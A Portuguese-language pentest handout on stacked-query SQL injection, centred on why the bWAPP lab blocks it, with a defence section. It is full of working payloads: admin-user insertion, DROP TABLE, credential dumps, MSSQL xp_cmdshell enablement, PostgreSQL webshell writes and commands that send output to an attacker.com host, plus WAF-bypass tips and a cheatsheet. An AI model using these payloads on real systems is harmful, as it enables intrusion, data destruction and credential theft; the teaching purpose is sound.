# SQL Injection — Stacked Queries (Piggy-backed Queries)
### Material de apoio — Pentest em Aplicações Web

> **Lição central deste arquivo:** Stacked Queries é a técnica mais poderosa de SQL Injection quando disponível — e ela **não funciona no bWAPP por design**. Entender por quê é mais valioso do que saber os payloads.

---

## Sumário

1. [O que são Stacked Queries](#1-o-que-são-stacked-queries)
2. [Por que é a técnica mais poderosa](#2-por-que-é-a-técnica-mais-poderosa)
3. [🚨 Por que NÃO funciona no bWAPP](#3--por-que-não-funciona-no-bwapp)
4. [Onde funciona por padrão](#4-onde-funciona-por-padrão)
5. [Sintaxe e payloads — MySQL com multi_query](#5-sintaxe-e-payloads--mysql-com-multi_query)
6. [Exemplos em MSSQL — o cenário mais famoso](#6-exemplos-em-mssql--o-cenário-mais-famoso)
7. [Exemplos em PostgreSQL](#7-exemplos-em-postgresql)
8. [Combinando stacked com outros canais de leitura](#8-combinando-stacked-com-outros-canais-de-leitura)
9. [Como testar empiricamente se stacked funciona](#9-como-testar-empiricamente-se-stacked-funciona)
10. [Como reconhecer no código — revisão estática](#10-como-reconhecer-no-código--revisão-estática)
11. [Pegadinhas comuns](#11-pegadinhas-comuns)
12. [Defesa — o que o desenvolvedor deve fazer](#12-defesa--o-que-o-desenvolvedor-deve-fazer)
13. [Cheatsheet final](#13-cheatsheet-final)

---

## 1. O que são Stacked Queries

Stacked Queries (também chamadas de **Piggy-backed Queries**) é a técnica de injetar uma **segunda query SQL completa**, separada por ponto-e-vírgula (`;`), logo após o ponto de injeção.

```sql
-- Query original montada pela aplicação:
SELECT * FROM movies WHERE title LIKE '%iron%'

-- Após injeção de stacked query:
SELECT * FROM movies WHERE title LIKE '%iron'; DROP TABLE movies; -- -%'
--                                           ^
--                                           separador — aqui começa a 2ª query
```

A diferença fundamental para as outras técnicas:

| Técnica          | Objetivo principal     | Modifica dados? | Executa comandos? |
|------------------|------------------------|-----------------|-------------------|
| UNION-based      | Leitura de dados       | ❌ Não          | ❌ Não            |
| Error-based      | Leitura via mensagens  | ❌ Não          | ❌ Não            |
| Blind (Boolean)  | Leitura bit a bit      | ❌ Não          | ❌ Não            |
| Blind (Time)     | Confirmação de SQLi    | ❌ Não          | ❌ Não            |
| **Stacked**      | **Tudo acima + mais**  | ✅ **Sim**      | ✅ **Sim**        |

💡 Stacked queries são a **única** técnica de SQLi que permite **escrita arbitrária** no banco — INSERT, UPDATE, DELETE, DROP, CREATE — e, dependendo do SGBD, **execução de comandos no sistema operacional**.

---

## 2. Por que é a técnica mais poderosa

Quando stacked queries funcionam, o atacante pode:

**Criar usuário administrador diretamente:**
```sql
'; INSERT INTO users (login, password, email, admin) VALUES ('hacker', SHA1('hack123'), 'h@x.com', 1); -- -
```

**Elevar privilégio de conta existente:**
```sql
'; UPDATE users SET admin=1 WHERE login='bee'; -- -
```

**Destruir dados (sabotagem):**
```sql
'; DROP TABLE blog; -- -
'; DELETE FROM users WHERE admin=0; -- -
```

**Criar stored procedures maliciosas:**
```sql
'; CREATE PROCEDURE backdoor() BEGIN SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt'; END; -- -
```

**Em MSSQL — execução de comandos no SO (RCE):**
```sql
'; EXEC master..xp_cmdshell 'whoami'; -- -
```

Isso coloca stacked queries em uma categoria completamente diferente das outras. UNION te dá **leitura**. Stacked te dá **controle**.

---

## 3. 🚨 Por que NÃO funciona no bWAPP

Esta é a parte mais importante deste arquivo. **Stacked queries não funcionam no bWAPP**, e isso não é um bug — é uma consequência da forma como o PHP usa o driver MySQL.

### O código real do bWAPP

Abra qualquer arquivo de exercício SQLi do bWAPP. Por exemplo, `bWAPP/sqli_1.php`:

```php
// bWAPP/sqli_1.php — linha ~145
$recordset = mysqli_query($link, $sql);
```

O problema está na função `mysqli_query()`.

### Por que mysqli_query bloqueia stacked queries

A documentação oficial do PHP é clara:

> `mysqli_query()` — "Se você executar queries compostas, **apenas a primeira query é executada**."

A função foi projetada para executar **uma única statement**. Quando você injeta:

```
iron'; DROP TABLE users; -- -
```

O que acontece internamente:

1. A aplicação monta: `SELECT * FROM movies WHERE title LIKE '%iron'; DROP TABLE users; -- -%'`
2. O PHP passa essa string para `mysqli_query()`
3. O driver executa **apenas**: `SELECT * FROM movies WHERE title LIKE '%iron'`
4. Tudo após o `;` é **silenciosamente ignorado** (ou gera erro de sintaxe na primeira query se o contexto não fechar corretamente)
5. `DROP TABLE users` **nunca é executado**

### Confirmação empírica com SLEEP()

O teste definitivo usa `SLEEP()` como oracle temporal. Se stacked funcionasse, este payload travaria a resposta por 5 segundos:

```
iron'; SELECT SLEEP(5); -- -
```

**Resultado no bWAPP:** A resposta volta em menos de 500ms. O `SLEEP(5)` nunca executou.

⚠️ Mas atenção — `SLEEP()` em si **funciona** no MySQL/MariaDB do bWAPP. Para confirmar isso, teste via UNION:

```
iron' UNION SELECT SLEEP(5),NULL,NULL,NULL,NULL,NULL,NULL -- -
```

Esse payload **vai demorar ~5 segundos** — porque UNION é executado dentro da mesma statement, que `mysqli_query()` processa normalmente.

**Conclusão:** O bloqueio é específico de stacked queries. O banco executa SLEEP — mas só dentro da mesma statement. A segunda statement separada por `;` é descartada.

### Resumo visual

```
Payload stacked:   iron'; SELECT SLEEP(5); -- -
                         ^
                         mysqli_query para aqui — o resto é ignorado

Resultado:         Resposta em < 500ms ✅ (stacked bloqueada)

---

Payload UNION:     iron' UNION SELECT SLEEP(5),NULL,NULL,NULL,NULL,NULL,NULL -- -
                   (tudo numa mesma statement)

Resultado:         Resposta em ~5 segundos ✅ (SLEEP executou, mysqli_query ok)
```

---

## 4. Onde funciona por padrão

| Ambiente                                              | Stacked? | Observação                                              |
|-------------------------------------------------------|----------|---------------------------------------------------------|
| **PHP + `mysqli_query()`**                            | ❌ Não   | Só executa a primeira statement — é o caso do bWAPP    |
| **PHP + `mysqli_multi_query()`**                      | ✅ Sim   | Função específica para múltiplas queries — raríssimo    |
| **PHP + PDO MySQL (`ATTR_EMULATE_PREPARES=true`)**    | ✅ Sim   | Era o default em PHP < 8.0 — vulnerável                |
| **PHP + PDO MySQL (`ATTR_EMULATE_PREPARES=false`)**   | ❌ Não   | Driver nativo bloqueia — configuração segura            |
| **Java JDBC com `allowMultiQueries=true`**            | ✅ Sim   | Flag na connection string — vulnerável quando presente  |
| **Java JDBC sem `allowMultiQueries`**                 | ❌ Não   | Default seguro                                          |
| **Python mysql-connector com `multi=True`**           | ✅ Sim   | Parâmetro explícito no `execute()`                      |
| **Microsoft SQL Server (qualquer driver .NET/ODBC)**  | ✅ Sim   | **Nativo** — stacked é padrão no MSSQL                  |
| **PostgreSQL via libpq**                              | ✅ Sim   | **Nativo** — stacked é padrão no PostgreSQL             |

💡 A regra geral: MSSQL e PostgreSQL são vulneráveis a stacked queries **por padrão**, sem nenhuma configuração especial. Em MySQL/MariaDB, depende do driver e das flags usadas pelo desenvolvedor.

---

## 5. Sintaxe e payloads — MySQL com multi_query

> **Contexto hipotético:** Os exemplos abaixo assumem que `sqli_1.php` usasse `mysqli_multi_query()` em vez de `mysqli_query()`. Isso **não é o caso** no bWAPP real — mas ilustra o que seria possível se fosse.

### Inserir usuário administrador

```
iron'; INSERT INTO users (login, password, email, admin) VALUES ('hacker', SHA1('hack123'), 'h@x.com', 1); -- -
```

O que acontece: a query original (`SELECT * FROM movies WHERE ...`) executa primeiro e retorna resultados normais. A segunda query insere o usuário admin. A aplicação não percebe — do ponto de vista dela, a busca funcionou.

### Promover usuário existente

```
iron'; UPDATE users SET admin=1 WHERE login='bee'; -- -
```

Eleva a conta `bee` a administrador sem precisar saber a senha ou acessar o painel admin.

### Dropar tabela

```
iron'; DROP TABLE blog; -- -
```

⚠️ Irreversível sem backup. Em um pentest real, **nunca execute DROP/DELETE sem autorização explícita do cliente**.

### Criar tabela para exfiltração indireta

```
iron'; CREATE TABLE leak (data TEXT); INSERT INTO leak SELECT GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a) FROM users; -- -
```

Cria uma tabela temporária com as credenciais. Depois o atacante lê via outro endpoint que acesse esse banco, ou via SQLi de leitura em outra página.

### Escrever arquivo no filesystem

```
iron'; SELECT GROUP_CONCAT(login,0x3a,password) FROM users INTO OUTFILE '/var/www/html/dump.txt'; -- -
```

Requer que `secure_file_priv` permita escrita no diretório alvo e que o usuário MySQL tenha privilégio `FILE`. No Docker do bWAPP, depende da configuração do MariaDB.

---

## 6. Exemplos em MSSQL — o cenário mais famoso

MSSQL é o ambiente clássico para stacked queries. O driver .NET (`SqlClient`), ODBC e o `sqlsrv` do PHP executam múltiplas statements nativamente.

### xp_cmdshell — RCE direto

```sql
'; EXEC master..xp_cmdshell 'whoami'; -- -
```

Se `xp_cmdshell` estiver habilitado e a conta do SQL Server tiver permissão de `sysadmin`, esse payload executa `whoami` no sistema operacional do servidor.

### Habilitar xp_cmdshell (se desabilitado)

Se a conta da aplicação for `sysadmin` (um erro grave de configuração, mas comum em sistemas legados):

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -
```

Múltiplas statements na mesma injeção — possível porque MSSQL aceita stacked nativamente.

### OPENROWSET para movimento lateral

```sql
'; SELECT * FROM OPENROWSET('SQLOLEDB', 'attacker.com';'sa';'pass', 'SELECT * FROM master.dbo.sysdatabases'); -- -
```

Força o servidor MSSQL a se conectar a um servidor externo controlado pelo atacante — útil para capturar o hash NTLM da conta de serviço do SQL Server com Responder.

### Inserção em tabela para exfiltração

```sql
'; INSERT INTO temp_leak SELECT TOP 1 name FROM sys.databases; -- -
```

---

## 7. Exemplos em PostgreSQL

PostgreSQL também aceita stacked queries nativamente via libpq.

### COPY TO PROGRAM — escrita arbitrária / RCE

```sql
'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/shell.php'; -- -
```

Escreve um webshell diretamente no diretório web. Requer que o usuário PostgreSQL tenha role `SUPERUSER` ou `pg_write_server_files`.

### COPY TO PROGRAM — execução de comandos

```sql
'; COPY (SELECT 1) TO PROGRAM 'wget http://attacker.com/$(id | base64)'; -- -
```

Executa um comando via shell. A saída vai para o servidor do atacante codificada em base64.

### CREATE FUNCTION para RCE (versões antigas)

Em versões antigas do PostgreSQL com extensões C habilitadas:

```sql
'; CREATE FUNCTION sys(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT sys('id > /tmp/output'); -- -
```

Cria uma função que chama `system()` da libc diretamente. Versões modernas restringem isso, mas ambientes legados ainda são vulneráveis.

---

## 8. Combinando stacked com outros canais de leitura

Stacked queries têm uma limitação: **você não tem canal de retorno fácil**. A query original retorna resultados para a aplicação — a segunda query não.

Para exfiltrar dados via stacked queries, combine com outros canais:

### Stacked + INSERT — exfiltrar via tabela própria

```
iron'; INSERT INTO comments (text) SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database(); -- -
```

Injeta os nomes de tabela na coluna `text` da tabela `comments`. Se houver uma página pública de comentários, o dado aparece lá.

### Stacked + erro forçado — virar error-based

```
iron'; SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))); -- -
```

Se a aplicação exibir mensagens de erro da segunda query também, stacked vira error-based — você lê dados via mensagem de erro.

### Stacked + OUTFILE — exfiltrar para disco

```
iron'; SELECT GROUP_CONCAT(login,0x3a,password SEPARATOR 0x0a) FROM users INTO OUTFILE '/tmp/dump.txt'; -- -
```

Escreve credenciais em arquivo no servidor. Útil se você tiver outro vetor para ler esse arquivo (LFI, acesso SSH, etc.).

🎯 **Regra geral:** Stacked queries **não substituem** UNION/error/blind para **leitura**. Elas substituem quando o objetivo é **escrita ou execução de comandos**. Para leitura, combine com os outros canais.

---

## 9. Como testar empiricamente se stacked funciona

Siga esta sequência diagnóstica antes de investir tempo em payloads:

**Passo 1 — Confirme que há SQLi (pré-requisito)**

```
iron'
iron''
```
Um erro no primeiro e resultado normal no segundo confirma SQLi básica.

**Passo 2 — Teste stacked com SLEEP como oracle**

```
iron'; SELECT SLEEP(5); -- -
```

- Resposta demorou ~5s → stacked funciona. Continue.
- Resposta voltou em < 1s → stacked bloqueada. Pare aqui.

**Passo 3 — Confirme que SLEEP funciona (para eliminar falso negativo)**

```
iron' UNION SELECT SLEEP(5),NULL,NULL,NULL,NULL,NULL,NULL -- -
```

- Demorou ~5s → SLEEP funciona no banco; o bloqueio é específico de stacked.
- Não demorou → banco pode não suportar SLEEP ou número de colunas errado — ajuste.

**Passo 4 — Confirme stacked com erro de tabela inexistente**

```
iron'; INSERT INTO tabela_xyz_inexistente VALUES (1); -- -
```

- Erro "table doesn't exist" → a segunda query foi avaliada — stacked funciona.
- Sem erro / resposta normal → segunda query nunca executou — bloqueada.

---

## 10. Como reconhecer no código — revisão estática

Durante revisão de código, procure pelos seguintes padrões:

### PHP — vulnerável

```php
// VULNERÁVEL: mysqli_multi_query executa múltiplas statements
mysqli_multi_query($link, $sql);

// VULNERÁVEL: PDO com emulação de prepares habilitada (default PHP < 8.0)
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

### PHP — seguro

```php
// SEGURO: mysqli_query só executa uma statement
mysqli_query($link, $sql);

// SEGURO: PDO com emulação desabilitada
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
```

### Java — vulnerável

```
// VULNERÁVEL: flag na connection string
jdbc:mysql://localhost/app?allowMultiQueries=true
```

### MSSQL e PostgreSQL

❌ Não existe configuração "segura" equivalente — ambos executam stacked nativamente. A defesa está em usar **prepared statements** e **contas com privilégios mínimos**, não em desabilitar múltiplas queries.

---

## 11. Pegadinhas comuns

**1. Esquecer de comentar o resto da query**

```
iron'; DROP TABLE blog    ← sem comentário
```

A query original termina com `'%'` ou similar — o que sobrar depois do payload vai gerar erro de sintaxe e a segunda query não executa. Sempre feche com `-- -` ou `#`.

**2. Encoding do `;` em requisições URL**

O ponto-e-vírgula pode ser interpretado por proxies ou WAFs. Se necessário, use `%3B` no lugar de `;`. Teste ambas as formas.

**3. WAFs filtrando keywords**

WAFs modernos bloqueiam `DROP`, `EXEC`, `xp_cmdshell`, `INSERT` em parâmetros. Técnicas de bypass:
- Case mixing: `DrOp`, `eXeC`
- Comentários inline: `DR/**/OP`, `EX/**/EC`
- Encoding hexadecimal de strings embutidas

**4. Confundir stacked queries com subqueries**

```sql
-- Subquery (NÃO é stacked — é uma query aninhada dentro de outra):
SELECT * FROM movies WHERE id = (SELECT id FROM users WHERE admin=1)

-- Stacked query (segunda statement separada por `;`):
SELECT * FROM movies WHERE id=1; SELECT * FROM users WHERE admin=1
```
Subquery funciona em qualquer lugar que aceita SQL. Stacked depende do driver.

**5. Em MSSQL, stored procedures via sp_executesql**

Algumas aplicações MSSQL usam `sp_executesql` dinamicamente — a injeção pode acabar dentro de uma string sendo passada como parâmetro. Nesses casos, pode ser necessário escapar o contexto do `sp_executesql` antes de empilhar queries.

**6. MySQL STRICT mode e transações**

Em MySQL com `STRICT_TRANS_TABLES`, erros de constraint em INSERT dentro de stacked queries podem fazer rollback silencioso. Teste primeiro com INSERT em tabela sem constraints.

---

## 12. Defesa — o que o desenvolvedor deve fazer

🛡️ **Prepared statements parametrizados** — a defesa universal

```php
// CORRETO — parâmetro nunca é interpolado no SQL
$stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE ?");
$stmt->execute(['%' . $title . '%']);
```

Prepared statements eliminam SQLi completamente, independente de stacked, UNION, blind ou error-based.

🛡️ **MySQL via PHP: nunca usar `mysqli_multi_query` sem necessidade**

Se a aplicação não precisa executar múltiplas queries em sequência (a grande maioria não precisa), `mysqli_multi_query` não deve existir no código.

🛡️ **PDO MySQL: desabilitar emulação de prepares**

```php
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
```

Com emulação desabilitada, o PDO usa prepared statements reais do banco — stacked queries e SQLi em geral são bloqueadas pelo driver.

🛡️ **Java JDBC: não usar `allowMultiQueries=true`**

O default do MySQL Connector/J é seguro. Só adicione essa flag se houver razão técnica documentada e a query for construída com parâmetros, nunca com concatenação.

🛡️ **MSSQL: revogar `xp_cmdshell` e roles administrativas da conta da aplicação**

```sql
-- Na conta usada pela aplicação:
DENY EXECUTE ON xp_cmdshell TO app_user;
-- Nunca usar 'sa' ou roles com sysadmin para a conta da aplicação
```

🛡️ **PostgreSQL: usar role com privilégios mínimos**

```sql
-- Criar role sem superuser, sem CREATEROLE, sem privilégio FILE:
CREATE ROLE app_user LOGIN PASSWORD '...' NOSUPERUSER NOCREATEDB NOCREATEROLE;
GRANT SELECT, INSERT, UPDATE ON TABLE movies TO app_user;
```

Com uma role limitada, mesmo que stacked funcione, o atacante não consegue usar `COPY TO PROGRAM` ou criar funções C.

---

## 13. Cheatsheet final

```
# ──────────────────────────────────────────────
# DIAGNÓSTICO — testar se stacked funciona
# ──────────────────────────────────────────────

# Teste temporal (stacked com SLEEP):
'; SELECT SLEEP(5); -- -

# Confirmar que SLEEP funciona no banco (via UNION):
' UNION SELECT SLEEP(5),NULL,NULL,NULL,NULL,NULL,NULL -- -

# Teste com tabela inexistente (erro = stacked ativa):
'; INSERT INTO xyz_inexistente VALUES (1); -- -


# ──────────────────────────────────────────────
# MySQL (requires mysqli_multi_query ou PDO emulate)
# ──────────────────────────────────────────────

# Inserir admin:
'; INSERT INTO users (login, password, admin) VALUES ('x', SHA1('x'), 1); -- -

# Elevar privilégio:
'; UPDATE users SET admin=1 WHERE login='bee'; -- -

# Dropar tabela (⚠️ IRREVERSÍVEL — só com autorização):
'; DROP TABLE blog; -- -

# Exfiltrar para tabela própria:
'; INSERT INTO comments (text) SELECT GROUP_CONCAT(login,0x3a,password) FROM users; -- -

# Exfiltrar para arquivo:
'; SELECT GROUP_CONCAT(login,0x3a,password) FROM users INTO OUTFILE '/tmp/dump.txt'; -- -


# ──────────────────────────────────────────────
# MSSQL — RCE via xp_cmdshell
# ──────────────────────────────────────────────

# Executar comando (xp_cmdshell habilitado):
'; EXEC master..xp_cmdshell 'whoami'; -- -

# Habilitar xp_cmdshell (conta sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; -- -


# ──────────────────────────────────────────────
# PostgreSQL — file write / RCE
# ──────────────────────────────────────────────

# Escrever webshell (superuser ou pg_write_server_files):
'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/shell.php'; -- -

# Executar comando via PROGRAM:
'; COPY (SELECT 1) TO PROGRAM 'id > /tmp/out'; -- -


# ──────────────────────────────────────────────
# ENCODING
# ──────────────────────────────────────────────

; → %3B   (quando WAF ou proxy bloqueia ponto-e-vírgula literal)
```

---

## Recapitulando

| Pergunta                                       | Resposta                                         |
|------------------------------------------------|--------------------------------------------------|
| Stacked funciona no bWAPP?                     | ❌ Não — `mysqli_query()` bloqueia               |
| Por que bloqueia?                              | `mysqli_query()` aceita apenas uma statement     |
| Tem como confirmar empiricamente?              | ✅ Sim — SLEEP não atrasa; UNION com SLEEP atrasa |
| Onde stacked é nativo sem configuração?        | MSSQL e PostgreSQL                               |
| Qual a diferença para UNION?                   | UNION = leitura; Stacked = escrita + execução    |
| O que fazer se stacked for bloqueada?          | Usar UNION, error-based ou blind para leitura    |
| Qual a defesa definitiva?                      | Prepared statements parametrizados               |
